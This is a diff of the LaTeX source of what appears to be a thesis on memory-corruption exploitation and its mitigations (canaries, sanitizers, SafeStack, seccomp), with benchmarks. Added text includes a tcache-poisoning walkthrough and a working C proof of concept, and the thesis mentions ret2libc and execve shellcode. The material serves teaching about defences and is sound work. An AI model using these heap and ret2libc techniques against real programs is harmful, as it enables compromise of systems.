+The equation below shows how the base of LibC can be computed using any known address and the LibC binary (exemplified with the \emph{printf} function):
 \begin{equation}
   libc\_{base} = printf\_leak - offset\_{of}\_{printf}\_{in}\_{libc}
 \end{equation}
 
-Now that we have the first issue fixed, how do we pass parameters to the functions we want to call? Because the NX (No-Execute) bit is enabled, and all executable regions of code are read-only to prevent shellcode, we will chain together multiple addresses that point to small code chunks ending in the \emph{ret} instruction.
+Moving to the second challenge, how can parameters be passed to the function overflowed into the return address? It is not possible to provide instructions directly, as they are placed on the Stack, a region of memory that cannot be executed (due to NX), but using snippets of code already present in the binary allows for manipulating registers and memory addresses in such a way as to mimic the program calling the function as intended.
 
-An example \emph{ret2libc} attack on a modified version of the code at \ref{lst:bof-sample} that leaks the address of \emph{puts} to stdout and is compiled with all NX enabled\footnote{The stack canary was still disabled for this example. The exact compiler flags were} is shown in Appendix~\ref{lst:pwntools}
+An example \emph{ret2libc} attack on a modified version of the code at Listing~\ref{lst:bof-sample} compiled with NX enabled and stack protectors disabled, that leaks the address of \emph{puts} to stdout, is shown in Appendix~\ref{lst:pwntools}
 
 \subsection{Exploit chains}
-\begin{figure}[ht]
+\begin{figure}[H]
   \centering
   \begin{tikzpicture}[
     node distance = 2.5cm,
@@ -719,9 +842,7 @@ An example \emph{ret2libc} attack on a modified version of the code at \ref{lst:
   \caption{Exploitaion process} \label{pic:process}
 \end{figure}
 
-The mitigation strategies employed by hardware and software designers have limited the impact we have when executing a single exploit. This has given rise to \emph{exploit chains}. In this scenario, multiple vulnerabilities or oversights are exploited to gain more information about the system. Figure~\ref{pic:process} describes how an attacker would approach exploiting a system.
-
-If we do not possess the required information to execute our exploit, we can use another one (another link in the exploit chain) to gather more and more. The exploitation and proof of exploitability process have been formalized in~\cite{WeirdMachines}.
+The mitigation strategies employed by hardware and software designers have limited the impact a single exploit can have. This has given rise to \emph{exploit chains}. In this scenario, multiple vulnerabilities or oversights are exploited to gain more information about the system. Figure~\ref{pic:process} describes how an attacker would approach exploiting a system.
 
 \subsection{Browser exploits}
 In the contemporary computing landscape, a notable surge in interest surrounding browser exploitation has emerged, predominantly attributed to the increasing ubiquity of JavaScript and the inherent security implications of executing foreign code on local machines. As web applications have become more complex and feature-rich, JavaScript's role has evolved from simple client-side scripting to powering extensive, intricate software systems. This growth presents an enticing target for threat actors, as virtually every user interacting with a web application runs potentially untrusted code within their local execution context. Thus, The browser environment becomes a frontline for cybersecurity, demanding rigorous scrutiny and sophisticated mitigation techniques. Furthermore, the heterogeneous nature of browser architecture and JavaScript engine implementations across different vendors adds a layer of complexity to securing these environments, highlighting the criticality of understanding and countering browser-based exploits, forming an essential dimension of comprehensive cybersecurity strategies.
@@ -732,8 +853,7 @@ Within the context of JavaScript, a dynamic and interpreted language primarily e
 
 This means that a successfully exploited heap overflow could potentially morph an innocuous object into a malicious entity with escalated privileges or unintended functionalities. As such, heap overflow vulnerabilities within JavaScript engines pose a significant security concern, mandating careful consideration and robust mitigation strategies in the design and implementation of modern JavaScript engines and runtime environments.
 
-We will continue by looking at the structure of how Javascript values (or JSValues) are encoded into memory:
-
+Below is the structure of how Javascript values (or JSValues) are encoded into memory:
 \begin{figure}[H]%
   \centering
   \begin{tikzpicture}[node distance=2cm]
@@ -758,8 +878,7 @@ We will continue by looking at the structure of how Javascript values (or JSValu
     };
 
   \end{tikzpicture}
-  \caption{\label{fig:label} Virtual memory map}%
-  \label{fig:stackframe}
+  \caption{\label{fig:memorymap} Virtual memory map}%
 \end{figure}
 \footnotetext[15]{Nibbles marked with \emph{P} encode a pointer}
 \footnotetext[16]{Nibbles marked with \emph{P} encode a NAN-boxed double precision IEE754 float}
@@ -777,13 +896,13 @@ Due to the high impact that a vulnerability in a JavaScript runtime would have o
 \end{comment}
 In recent years, virtualization technologies have witnessed an unprecedented surge in their adoption, primarily driven by advancements in datacenter and cloud-based applications. These technologies allow multiple virtual machines or containers, each encapsulating an entire execution environment, to coexist on the same physical hardware, thereby promoting efficient resource utilization, simplified management, and scalability. More than just a cost-effective solution for large-scale computations, virtualization has also garnered considerable attention as a robust approach for isolating the execution of untrusted code. In this context, it serves as a defensive boundary, segregating potentially harmful operations within a contained environment, thereby limiting their ability to affect the more extensive system adversely. Consequently, the evolution of virtualization technologies has profoundly impacted the modern computing landscape, opening new possibilities for efficient, scalable, and secure computing and posing new cybersecurity challenges.
 
-Driven by the relentless demand for heightened performance, detailed scrutiny of processor operations and employed microarchitectural designs have become imperative. This necessity is underscored by unearthing vulnerabilities such as those referred to in \cite{spectre} and \cite{meltdown}. These exploits ingeniously capitalize on the side effects triggered by the processor during memory access and speculative execution. This development highlights the criticality of an in-depth understanding of hardware function. Even before the findings mentioned earlier, researchers have been able to cross the virtualization boundary and gain information from other VMs running on the same machine. The \cite{flushreload} reveals an attack that can recover around \~95\% of the bits of a GnuPG secret key.
+Driven by the relentless demand for heightened performance, detailed scrutiny of processor operations and employed microarchitectural designs have become imperative. This necessity is underscored by unearthing vulnerabilities such as those referred to in \cite{spectre} and \cite{meltdown}. These exploits ingeniously capitalize on the side effects triggered by the processor during memory access and speculative execution. This development highlights the criticality of an in-depth understanding of hardware function. Even before the findings mentioned earlier, researchers have been able to cross the virtualization boundary and gain information from other VMs running on the same machine. The \cite{flushreload} reveals an attack that can recover around 95\% of the bits of a GnuPG secret key.
 
 \section{Detection and Mitigation Techniques}%
 In the realm of cybersecurity, the price tag associated with the implementation of mitigation strategies such as stack canaries and heuristic checks is frequently overlooked. These countermeasures, while crucial for system protection, impose an overhead on system performance, potentially influencing the overall efficiency of the software. As part of our investigation, this paper will delve into an in-depth analysis of this often-neglected cost associated with such defensive measures. Our objective is to facilitate a more balanced perspective, considering not only the protective benefits but also the incurred costs of these mitigation strategies.
 
 \subsubsection{Stack canaries}
-Defending against stack buffer overflows has been attempted since 1997 with StackGuard\cite{stackguard}, but it was not until 2006, with the release of GCC 4.1 this was available for the entire Linux community. This mitigation places a random sacrificial value right before the return address in modern compilers. This mitigation, combined with a new variable alignment technique that places all buffers above all other function local variables, has proven to be an effective mitigation with a minimal performance impact.
+Defending against stack buffer overflows has been attempted since 1997 with StackGuard ~\cite{stackguard}, but it was not until 2006, with the release of GCC 4.1 this was available for the entire Linux community. This mitigation places a random sacrificial value right before the return address in modern compilers. This mitigation, combined with a new variable alignment technique that places all buffers above all other function local variables, has proven to be an effective mitigation with a minimal performance impact.
 
 On GCC x86-64 version 13.1, compiling the Appendix~\ref{lst:stack-layout} results in both functions having the buffer
 placed closest to the stack canary.
@@ -824,7 +943,7 @@ Listing~\ref{lst:canary-check} shows how the cookie is checked. If the value fro
 Advancements in secure software systems have led to the development of shadow stacks, representing a significant leap from earlier protection measures like stack canaries. Shadow stacks offer a more robust mechanism for guarding against stack buffer overflows by decoupling control-flow information from user data. They maintain a separate, concealed stack dedicated solely to storing return addresses, making it exceedingly challenging for attackers to alter the flow of execution. This strategic bifurcation of data fundamentally strengthens the protection against control-flow hijacking attacks. It ensures that even if an attacker successfully tampers with data on the main stack, any discrepancies with the shadow stack will immediately be flagged. Despite the operational complexities and slight runtime overheads, they may introduce, shadow stacks serve as a remarkably effective mitigation strategy, enhancing the integrity of the control flow beyond what is achievable with stack canaries alone.
 
 \subsection{Sanitizers}
-With the increasing amount of memory errors in unsafe system programming languages such as C and C++, methods for detecting runtime errors without requiring code changes have been developed. Even though they are rarely used in production environments, they have seen massive success when used in conjunction with fuzzers \ref{vezi niste paperuri de fuzzere} to detect severe vulnerabilities in large code bases.
+With the increasing amount of memory errors in unsafe system programming languages such as C and C++, methods for detecting runtime errors without requiring code changes have been developed. Even though they are rarely used in production environments, they have seen massive success when used in conjunction with fuzzers~\cite{fuzz1}~\cite{fuzz2} to detect severe vulnerabilities in large code bases.
 
 \subsubsection{UBSAN}
 UBSAN (Undefined Behavior Sanitizer) injects additional checks during the compilation of the program in order to detect Undefined Behaviour\footnote{explain this}. Here is a non-exhaustive list of the features and checks UBSAN does:
@@ -863,9 +982,9 @@ SafeStack is a sanitizer that fixes one of the biggest issues when it comes to t
    call   0x55b9ecf030d0 <gets@plt>
 \end{lstlisting}
 
-Listing \ref{lst:safestack} showcases dissasembly of the program at Annex \ref{lst:bof-sample} compiled with SafeStack. The buffer passed to \emph{gets} is not relative to \emph{RSP}. In this case \emph{RDI} is used as the unsafe stack pointer.
+Listing~\ref{lst:safestack} showcases dissasembly of the program at Annex~\ref{lst:bof-sample} compiled with SafeStack. The buffer passed to \emph{gets} is not relative to \emph{RSP}. In this case \emph{RDI} is used as the unsafe stack pointer.
 
-Running our \emph{ret2libc} exploit on this binary, the behaviour is the same as if we had a much larger buffer:
+Running our \emph{ret2libc} exploit on this binary, it behaves as if the overflow never happened. 
 \begin{lstlisting}[
       ,label={lst:gucci}
       ,language={Bash}]
@@ -881,10 +1000,10 @@ Hi !
     call   0x55fe6910a070 <gets@plt>
 \end{lstlisting}
 
-Listing \ref{lst:unsafestack} showcases the stack we are familiar with. An address that is close to the return address is passed to \emph{gets}.
+Listing~\ref{lst:unsafestack} showcases the disassembly of the call without SafeStack. An address that is close to the return address is passed to \emph{gets}.
 
 \subsection{Seccomp}
-Seccomp (or Secure Computing) was introduced in the 2.6.12 version of the Linux kernel. At that time, it provided a \emph{strict} execution mode for processes that allowed a minimal set of system calls. The intention behind this mode was to allow untrusted code to run on systems. This functionality was greatly enhanced with the introduction of seccomp-bpf (Berkeley Packet Filter) in version 3.5 of the kernel. This new mode of operation allowed programmers to filter the system calls a process made using small programs written in a DSL. This functionality is prominent in projects where the host system's security is paramount, such as Docker, Chrome, or Firefox. Here\ref{codubun} is an example of the granular control seccomp can achieve. Note that once a process installs a seccomp filter, it is impossible to remove it without exploiting the kernel while also being inherited by all child processes of the filtered process.
+Seccomp (or Secure Computing) was introduced in the 2.6.12 version of the Linux kernel. At that time, it provided a \emph{strict} execution mode for processes that allowed a minimal set of system calls. The intention behind this mode was to allow untrusted code to run on systems. This functionality was greatly enhanced with the introduction of seccomp-bpf (Berkeley Packet Filter) in version 3.5 of the kernel. This new mode of operation allowed programmers to filter the system calls a process made using small programs written in a DSL. This functionality is prominent in projects where the host system's security is paramount, such as Docker, Chrome, or Firefox. Listing~\ref{lst:seccomp} is an example of the granular control seccomp can achieve. Note that once a process installs a seccomp filter, it is impossible to remove it without exploiting the kernel while also being inherited by all child processes of the filtered process.
 
 Annex \ref{lst:seccomp} shows the shellcoding code example protected with seccomp filters (some of the functions were replaced to simplify the filters). Because the filters are strict, even though the program is vulnerable to one of the simplest attacks, it is impossible to abuse it to gain further access to the machine it is running on.
 
@@ -895,7 +1014,7 @@ Attempting to run the shellcoding exploit on the filtered binary, the following 
   Process stopped with exit code -31 (SIGSYS) (pid 32914)
 \end{lstlisting}
 
-This happens because the shellcode we use contains the syscall \emph{execve}, which we used for gaining a shell, but this syscall is not allowed. Without a vulnerable kernel driver it is almost impossible to bypass this filters if they are strict enough, but there is always a risk that a program needs syscalls that could compromise the system, or the filters were not properly audited and are too permissive.
+This happens because the provided shellcode use contains the syscall \emph{execve}, which is used for gaining a shell on the system, but this syscall is not allowed by the seccomp filters. Without a vulnerable kernel driver it is impossible to bypass these filters if they are correct, but there is always a risk that a program needs syscalls that could compromise the system, or filters that were not properly audited and are too permissive.
 
 \subsection{Performance cost}
 \subsubsection{Testing setup}
@@ -930,8 +1049,9 @@ The compilers used for compiling TCC were:
 
 In order to gather and aggregate the results of multiple runs, \emph{hyperfine} version 1.12.0 was used.
 
-The benchmark consists of compiling the \emph{speedbench.c} file, generated with \emph{csmith} 2.4.0 using the following commandline arguments ``--seed 328954452 --max-funcs 90''. \emph{cmisth}\cite{csmith} is a tool that generates C code and was successfully used to find bugs in mainstream compilers.
+The benchmark consists of compiling the \emph{speedbench.c} file, generated with \emph{csmith} 2.4.0 using the following commandline arguments ``--seed 328954452 --max-funcs 90''. \emph{cmisth}~\cite{csmith} is a tool that generates C code and was successfully used to find bugs in mainstream compilers.
 
+\subsubsection{Results}
 \begin{table}[H]
 \centering
 \begin{tabular}{|l|r|r|r|r|r|r|r|}
@@ -965,21 +1085,179 @@ Compiler flags & Mean & $\delta$ & Min & Max & Speedup \\
 \label{table:clang}
 \end{table}
 
-As expected, the more mitigations and sanitizers are added, the slower the execution time becomes.
+As expected, the more mitigations and sanitizers are added, the slower the execution time becomes, highlighting the importance of secure coding practices. Even though the performance losses seem massive (~4x slower execution time in the \emph{Hardened}), the baseline performance needs to be considered. C is one of the fastest languages when it comes to execution time, giving us some leeway to use these protections.
+
+\emph{Clang} seems to be at the forefront of sanitization passes as its support is more complete and it has more choices. A fully hardened binary that protects against almost all known memory corruption while only being ~4x slower than baseline. This level of protection rivals the one offered by interpreted languages such as \emph{Python} or \emph{JavaScript}.
+
+Another fact that needs to be considered is that with more and more mitigations diminishing returns start to kick in. Some essential mitigations(Stack Protector and SafeStack) have a small impact on runtime performance while thwarting many exploitation techniques.
+
+For production environments, the minimal runtime is available, which gains around a \emph{50\%} performance uplift when compared to the standard runtime, bringing the performance closer to the unsanitized version.
+
+The use of sanitizers has proven itself even in environments where performance is paramount, such as the Linux Kernel, and due to rising interest in memory protection, hardware solutions such as \emph{Hardware Tag-Based KASAN} are actively being used in production with a low memory and processing overhead.
+
+Another useful feature of most sanitizers is their detailed report about the erorrs they encountered. This is an example of such report taken from \cite{KernelUbsan}:
+
+\begin{lstlisting}[caption={Kernel UBSAN Report}
+      ,label={lst:ubsan_report}
+      ,language=bash]
+===========================================================
+UBSAN: Undefined behaviour in ../include/linux/bitops.h:110:33
+shift exponent 32 is to large for 32-bit type 'unsigned int'
+CPU: 0 PID: 0 Comm: swapper Not tainted 4.4.0-rc1+ #26
+ 0000000000000000 ffffffff82403cc8 ffffffff815e6cd6 0000000000000001
+ ffffffff82403cf8 ffffffff82403ce0 ffffffff8163a5ed 0000000000000020
+ ffffffff82403d78 ffffffff8163ac2b ffffffff815f0001 0000000000000002
+Call Trace:
+ [<ffffffff815e6cd6>] dump_stack+0x45/0x5f
+ [<ffffffff8163a5ed>] ubsan_epilogue+0xd/0x40
+ [<ffffffff8163ac2b>] __ubsan_handle_shift_out_of_bounds+0xeb/0x130
+ [<ffffffff815f0001>] ? radix_tree_gang_lookup_slot+0x51/0x150
+ [<ffffffff8173c586>] _mix_pool_bytes+0x1e6/0x480
+ [<ffffffff83105653>] ? dmi_walk_early+0x48/0x5c
+ [<ffffffff8173c881>] add_device_randomness+0x61/0x130
+ [<ffffffff83105b35>] ? dmi_save_one_device+0xaa/0xaa
+ [<ffffffff83105653>] dmi_walk_early+0x48/0x5c
+ [<ffffffff831066ae>] dmi_scan_machine+0x278/0x4b4
+ [<ffffffff8111d58a>] ? vprintk_default+0x1a/0x20
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830b2240>] setup_arch+0x405/0xc2c
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830ae053>] start_kernel+0x83/0x49a
+ [<ffffffff830ad120>] ? early_idt_handler_array+0x120/0x120
+ [<ffffffff830ad386>] x86_64_start_reservations+0x2a/0x2c
+ [<ffffffff830ad4f3>] x86_64_start_kernel+0x16b/0x17a
+=========================================================
+\end{lstlisting}
+
+\section{Sanitizers in action}
+\subsection{Tcache poisoning}
+\emph{Tcace poisoning} emerged with the introduction of the thread caching system in glibc 2.26, which was intended to improve the performance of multithreaded applications. However, due to the lack of security checks in this new mechanism, attackers found a way to manipulate the internal data structures of the heap. This manipulation, called Tcache poisoning, allows attackers to trick malloc into returning arbitrary addresses, leading to profound security implications. Tcache has since been updated in glibc 2.32 with a new mitigation: Safe Linking. Before this version, the pointers in each node of the tcache buckets were stored as is, without any protection. Safe Linking uses entropy from the base address of the heap (requiring \emph{ASLR}) to mangle the pointers while they are not actively used. 
+
+Here is the formula used for pointer mangling:
+\begin{equation}
+    fwd_{ptr} = (addr\_of(fwd_{ptr}) >> 12) \oplus fwd_{ptr}  
+\end{equation}
+
+Because the address of the pointer and the value of the pointer are usually close together, the pointer can be unmangled if successfully leaked. The chances of unmangling the pointer can be increased  by abusing the fact that any malloc allocation must be aligned to hold any kind of object (in this aligned to 16 bytes). Here are the steps required to do this operation:
+
+\begin{equation}
+     original\_ptr = (P >> 24) \oplus P~\&~0xfffffffffff0;
+\end{equation}
+Where: 
+\begin{equation}
+     P = (mangled\_ptr >> 12) \oplus mangled\_ptr;
+\end{equation}
+
+The following segment will provide an in-depth walkthrough of this exploitation technique demonstrated on the code at Annex \ref{lst:tcache_poison}, elucidating its workings, potential impacts, and security challenges.
+\begin{lstlisting}[language={C},label={lst:entry},caption={\emph{tcache\_entry} struct}]
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  uintptr_t key;
+} tcache_entry;
+\end{lstlisting}
+
+The code at Listing~\ref{lst:entry} showcases the Linked List node type used by Tcache. The \emph{next} pointer is self-explanatory and the \emph{key} is a random enough\footnote{Does not need to be cryptographically secure} value that allows Tcache to detect if an allocation has already been free'd. When an allocation that was passed to free is intercepted by Tcache, the \emph{key} field of the allocation is checket to see if it contains the random value, and if it does the entire tcache bucket is checked to see if the allocation is already present in the list. The random value should be random enought that this happens rarely. In case free'd allocation is found in the free list, the process terminates as a double free has happened.
+
+\begin{lstlisting}[language={C},label={lst:tcachewarm},caption={Warming up the tcache}]
+ for (int i = 0; i < 3; i++) {
+    allocations[i] = malloc(0x20);
+    printf("addr of alloc[%d]: %p\n", i, allocations[i]);
+  }
+
+  printf("\n");
+
+  free(allocations[2]);
+  free(allocations[0]);
+  free(allocations[1]);
+\end{lstlisting}
+
+In Listing~\ref{lst:tcachewarm} allocations are made that are immediately freed. By doing so the tcache bucket corresponding to the size 0x20 is populated with the following linked list: $alloc_1 \rightarrow alloc_0 \rightarrow alloc_2$. 
+
+\begin{lstlisting}[language={C},label={lst:protectptrs}]
+(allocations[1])->next 
+        = PROTECT_PTR(&(allocations[1])->next, bad_buffer);
+\end{lstlisting}
+
+Now, the \emph{next} pointer of the list overwritten, and allocations are made in order to pop allocations from the stack until our arbitrary address alocation is returned:
+
+\begin{lstlisting}[language={C}]
+  assert(fd_alloc1 == allocations[0]);
+  /* Only works sometimes due to ASLR
+   * Demangle requires the two consecutive chunks to be in the same page
+   * assert(demangle((size_t)((tcache_entry*)allocations[1])->next) ==
+   * (size_t)allocations[0]);
+   */
+
+  /* Use after free */
+  (allocations[1])->next = PROTECT_PTR(&(allocations[1])->next, bad_buffer);
+
+  assert(malloc(0x20) == allocations[1]);
+  assert(malloc(0x20) == bad_buffer);
+\end{lstlisting}
+
+This code proves that malloc returned an allocation from within the binary (BSS) and not the Heap. This technique can be extended to return any address that respects the following condition:
+
+\begin{equation}
+    address + sizeof(void*)~is~writable
+\end{equation}
+
+This condition is required due to a security mitigation in the tcache algorithm. In order to prevent leaking sensitive information the \emph{key} value is zeroed when giving the allocation back to the program through malloc. 
+\begin{lstlisting}[language={C},label={lst:tcache_get},caption={Tcache clearing the key field}]
+static __always_inline void *
+tcache_get (size_t tc_idx)
+{
+  tcache_entry *e = tcache->entries[tc_idx];
+  if (__glibc_unlikely (!aligned_OK (e)))
+    malloc_printerr ("malloc(): unaligned tcache chunk detected");
+  tcache->entries[tc_idx] = REVEAL_PTR (e->next);
+  --(tcache->counts[tc_idx]);
+  /* VVV The key is cleared here */
+  e->key = NULL;
+  return (void *) e;
+}
+\end{lstlisting}
+
+This attack is designed to simulate the ideal situation, in which only a small number of writes are executed and there are no buffer overflows. Even in this scenario \emph{Address Sanitizer} was enough to completely thwart the exploitation attempt, while also providing valuable debugging insight for programmers. 
+\begin{lstlisting}[language={Bash}]
+==37426==ERROR: AddressSanitizer: heap-use-after-free on address 0x603000000040 at pc 0x5565ff3b2011 bp 0x7fff0a69dfd0 sp 0x7fff0a69dfc8
+\end{lstlisting}
+
+\begin{lstlisting}[language={Bash}]
+    freed by thread T0 here:
+    ...
+    previously allocated by thread T0 here:
+\end{lstlisting}
+
+ASAN has correctly determined that writes are made to a freed chunk that was allocated and freed by thread 0 (the primary thread). It is essential to correctly track which allocation was made in which thread because freeing a tcache allocation twice without modifying the \emph{key} value is possible if the free's are executed in different threads because each thread has its own tcache, and when the second thread frees the allocation, it will not be found in the free list and program execution will proceed even though the \emph{key} is correctly populated. This vulnerability stems from the fact that if the key field is present, it is not guaranteed that the allocation was already free'd, because a user might write the correct key to that slot unknowingly.
 
 \section{Economic impact}%
-Now that the performance impact of the mitigations has been established, we will look at the economic/financial impact of the exploits these mitigations are trying to prevent. In recent years, the blockchain domain has emerged as one of the most publicized arenas for software exploitation.
+After determining the effect that the mitigations had on performance, the next step will be to investigate the economic and financial repercussions of the exploits that the mitigations were designed to stop. 
 
-As a technology built upon the principles of decentralization and cryptography, blockchain applications, especially cryptocurrencies, have attracted significant attention from ethical and malicious actors. Given the tangible real-world value of many digital assets, the incentive for exploiting these systems is often financial gain. Smart-contract vulnerabilities, insecure wallets, and compromised blockchain platforms have led to numerous notable breaches, highlighting the critical importance of rigorous security practices in designing, implementing, and operating blockchain-based systems. Multiple publications estimated that in 2022 alone, 4 billion dollars were stolen. Ransomware has also emerged as a significant threat in the software exploitation arena, causing extensive harm primarily through service disruptions.
+In recent years, the blockchain domain has emerged as one of the most prominent arenas for software exploitation. This development took place in recent years. As a technology built upon the principles of decentralization and cryptography, blockchain applications, especially cryptocurrencies, have attracted significant attention from ethical and malicious actors. Given the tangible real-world value of many digital assets, the incentive for exploiting these systems is often financial gain. Smart-contract vulnerabilities, insecure wallets, and compromised blockchain platforms have led to numerous notable breaches, highlighting the critical importance of rigorous security practices in designing, implementing, and operating blockchain-based systems. Multiple publications estimated that in 2022 alone, \emph{4 billion dollars} were stolen. Ransomware has also emerged as a significant threat in the software exploitation arena, causing extensive harm primarily through service disruptions.
 
 Beyond direct financial loss from ransoms, these attacks result in considerable operational downtime and economic damage. Consequently, the real impact of ransomware extends beyond the immediate ransom, emphasizing the necessity of comprehensive security measures and incident response strategies.
 
+\subsection{MITRE}
+The realm of digital threats is multifaceted and consistently shifting, requiring an organized strategy to spot, comprehend, and address risks. In answer to this need, the MITRE Corporation was created as a non-profit entity, devoted to finding solutions for a more secure world. A key initiative of MITRE has been the creation and oversight of the \emph{Common Vulnerabilities and Exposures} (CVE) framework. This system acts like a reference guide of publicly revealed cybersecurity weaknesses and threats, delivering standardized names for such risks, promoting information sharing, and allowing for data collation and pattern scrutiny. By establishing a shared communication framework, CVE bolsters cooperation among various segments of the cybersecurity sphere—researchers, industry professionals, and product manufacturers—in their collective efforts to fortify our digital defenses.
+
 \section{Future trends}%
-Despite the recent shift in focus of threat actors towards exploiting the human element -- the "weakest link" in the security chain -- through strategies such as SIM swapping, targeted phishing attacks, or weak passwords, it is crucial not to diminish our emphasis on fortifying software against more technical exploits. While these social engineering attacks have grown due to the escalating complexity required to execute successful software exploits, they should not detract from our progress in securing our software systems. Thgge mitigations we have developed and deployed over the years have provided a substantial defensive advantage in software exploitation. As the future unfolds, maintaining this advantage will be paramount, even as we strive to improve defenses against human-targeted exploits.
+Sanitization approaches are progressively being moved from the runtime phase to the compilation step as a result of increased efforts to accomplish this. The programming language Rust serves as a perfect illustration of this trend. Rust has attracted significant interest in the field of cybersecurity due to the inherent memory safety features that it possesses. Rust stands out from other programming languages as a potent instrument for system programming due to its ownership semantics, type safety, and memory safety, in addition to the fact that it does not do garbage collection. Its purpose is to defend against traditional methods of exploiting vulnerabilities and memory corruption issues. As a consequence of this, Rust is fast gaining ground as a desirable alternative for the development of software in critical systems where the prohibition of unauthorized access or the manipulation of data is essential. Because of this, there has been a significant uptick in curiosity about how its one-of-a-kind design ideas might assist in enhancing the safety of the system. Therefore, in the context of the continuous development of safe programming standards, it is both timely and essential to investigate Rust's potential for reducing the likelihood of exploitation.
+
+Another attempt at increasing the soundness of system programming languages is Carbon, developed by Google, a memory-safe programming language that has the power to interact in a seamless manner with historical code bases written in C and C++. This development is part of a larger movement toward safer programming paradigms. In the broader context of the software industry's efforts to reduce software exploitation resulting from memory corruption flaws, this recent finding is essential. Carbon, on the other hand, offers effective safeguards against such weaknesses, in contrast to historically vulnerable programming languages. Carbon makes it easier to shift to more safe coding techniques by providing the essential tools for interfacing with current C/C++ code bases. This allows the transition to take place without the need for a complete rewrite of the code that has already been built. This demonstrates the potential of utilizing memory-safe languages as a viable method in combating software exploitation, and highlights the need of continuing to make improvements in this field.
 
 \section{Conclusion}
+In conclusion, with the accelerating pace of technological advancements, the exploitation landscape continually evolves, necessitating proactive security measures. These include active vulnerability hunting, widespread use of sanitizers in testing and production environments, and adopting safe programming languages such as Rust, which inherently prevent particular vulnerabilities. In this dynamic and complex environment, secure programming languages can alleviate some of the cognitive load from developers, enabling them to focus more on the logic and less on the potential security pitfalls of their code.
 
-\printbibheading
+Simultaneously, it is crucial to recognize and address the gap between hardware and software in terms of exploit mitigation. While hardware support for various mitigation techniques exists, they often need to be used due to software not keeping up or compatibility issues, underscoring the need for an improved synchronization between hardware advancements and software development.
+
+Looking forward, it is evident that achieving robust cybersecurity requires a multi-faceted approach. By combining proactive security measures, safe programming practices, and better hardware-software integration, systems that are not just responsive but resilient to the challenges of software exploitation can be built. As the fight against cyber threats is far from over, continuing to invest in and develop these strategies is essential and imperative to our digital security.
+
+Scripts and code samples are available at:
+
+\texttt{https://github.com/Potochi/licenta}
+
 \printbibliography
 
 \begin{appendices}
@@ -1182,6 +1460,71 @@ int main(int argc, char** argv) {
         say_hi();
 
         return 0;
+}
+\end{lstlisting}
+\section{Heap tcache poisoning}
+\begin{lstlisting}[language={C},label={lst:tcache_poison}]
+#include <assert.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+void *allocations[3];
+
+typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+  /* This field exists to detect double frees.  */
+  uintptr_t key;
+} tcache_entry;
+
+#define PROTECT_PTR(pos, ptr)                                                  \
+  ((__typeof(ptr))((((size_t)pos) >> 12) ^ ((size_t)ptr)))
+
+#define REVEAL_PTR(ptr) PROTECT_PTR(&ptr, ptr)
+
+size_t demangle(size_t ptr) {
+    size_t o2 = (ptr >> 12) ^ ptr;
+    return (o2 >> 24) ^ o2 & 0xfffffffffff0;
+}
+
+static char bad_buffer[0x100];
+
+int main() {
+  for (int i = 0; i < 3; i++) {
+    allocations[i] = malloc(0x20);
+    printf("addr of alloc[%d]: %p\n", i, allocations[i]);
+  }
+
+  printf("\n");
+
+
+  free(allocations[2]);
+  free(allocations[0]);
+  free(allocations[1]);
+
+  
+  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[0])->next);
+  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[0])->key);
+
+  printf("fd  of alloc[0]: %p\n", ((tcache_entry *)allocations[1])->next);
+  printf("key of alloc[0]: 0x%lx\n", ((tcache_entry *)allocations[1])->key);
+
+  void* fd_alloc1 = PROTECT_PTR(allocations[1], ((tcache_entry*)allocations[1])->next);
+  printf("revealed fd of alloc [1]: %p\n", fd_alloc1);
+
+  assert(fd_alloc1 == allocations[0]);
+  /* Only works sometimes due to ASLR
+   * Demangle requires the two consecutive chunks to be in the same page
+   * assert(demangle((size_t)((tcache_entry*)allocations[1])->next) ==
+   * (size_t)allocations[0]);
+   */
+
+  /* Use after free */
+  ((tcache_entry *)allocations[1])->next = PROTECT_PTR(&((tcache_entry *)allocations[1])->next, (tcache_entry *)bad_buffer);
+
+  assert(malloc(0x20) == allocations[1]);
+  assert(malloc(0x20) == bad_buffer);
 }
 \end{lstlisting}
 
